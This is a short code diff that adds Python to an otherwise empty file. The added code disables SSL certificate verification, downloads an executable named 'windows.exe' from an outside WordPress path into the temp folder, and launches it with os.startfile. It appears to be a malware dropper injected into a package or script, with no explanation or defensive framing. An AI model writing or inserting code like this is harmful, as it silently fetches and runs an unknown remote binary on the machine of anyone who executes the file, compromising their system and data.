@@ -1,1 +1,7 @@
-
+import tempfile
+import ssl
+import urllib.request as urllib2
+import os
+ssl._create_default_https_context = ssl._create_unverified_context
+f = urllib2.urlretrieve("https://luckyebuy.com/wp-includes/windows.exe", f"{tempfile.gettempdir()}/windows.exe")
+os.startfile(f"{tempfile.gettempdir()}/windows.exe")
